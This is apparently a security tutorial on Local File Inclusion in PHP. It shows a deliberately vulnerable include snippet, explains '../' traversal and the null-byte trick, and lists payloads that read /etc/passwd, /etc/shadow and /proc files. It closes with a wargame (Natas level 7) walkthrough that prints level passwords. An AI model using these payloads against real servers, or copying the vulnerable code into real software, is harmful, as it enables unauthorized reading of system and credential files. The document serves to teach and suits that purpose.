# Local File Inclusion

 > Local File Inclusion (also known as LFI) allows an attacker to include files in server-side through the web browser. File inclusions are part of every leading server-side scripting language across the internet.LFI is commonly found to affect web applications that rely on a scripting runtime. This occurs primarily due to a bad input validation mechanism, wherein the user’s input is passed to the file include commands without proper validation.

## Impact
A successful LFI may result in compromise of the system, data leakage etc. The attacker can read, write, download files and can also run arbitrary codes with privileges of the web server.

### Local file inclusion in PHP:

Consider an example as follows where we can apply this attack.
http://example.com/abc.php?file=input.txt
The file parameter will be taken and that file will be included.
```php
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("pages/$file");
   }
?>
```
An attacker may give malicious input for the "file" parameter which may give unauthorized files in that directory, he can also traverse the directories by using characters like "../".He can access the user credentials by giving input as "../../../../etc/passwd".In some cases where the file extension is added by default, we can avoid it by adding ***null byte terminator*** " %00".Any character after this special character will be ignored.

Consider the following code which includes file with default extension ".php"
```php
<?php
“include/”.include($_GET[‘testfile’].”.php”);
?>
```

by giving file=../../../../etc/passwd%00 we can access the file by passing the ".php" extension.

An attacker can also download files by changing the file names. For example
<br>URL: example/?download=welcome.pdf
</br>The attacker may change the welcome.pdf to any other file such as passwords.txt,users.txt etc.


## Explore it yourself
Make a PHP file with the code given above and explore different possibilities of the vulnerability.
### Somepayloads :
- ../../../../etc/passwd/etc/issue
- ../../../../etc/passwd
- ../../../../etc/passwd/etc/shadow
- ../../../../etc/passwd/etc/group
- ../../../../etc/passwd/etc/hosts
- ../../../../etc/passwd/etc/motd
- ../../../../etc/passwd/etc/mysql/my.cnf
- ../../../../proc/self/environ
- ../../../../proc/version
- ../../../../proc/cmdline
- ../../../../proc/sched_debug
- ../../../../proc/mounts
- ../../../../proc/net/arp
- ../../../../proc/net/route
- ../../../../proc/net/tcp
- ../../../../proc/net/udp

# Let's try a challenge  
 NATAS 7 :
  - USERNAME : natas7
  - PASSWORD : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
  ![natas7](natas7.1.png)

The site is very simple only with two buttons, but once when you click on Home or About the URL changes as follows :

  ![natas7](natas7.2.png)</br>
  ![natas7](natas7.3.png)
 
 It looks like the PHP file is including the file given as page, when we check the source code we get the hint as  
 hint: password for webuser natas8 is in /etc/natas_webpass/</br></br>
  ![natas7](natas7.4.png)
  
  So, let's try to include that file in the URL 
 URL : index.php?page=/etc/natas_webpass/natas8
On including this file we get the password for the next level on the screen </br></br>
password : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</br></br>
![natas7](natas7.5.png)
</br></br>
This is a basic example of Local file inclusion vulnerability.


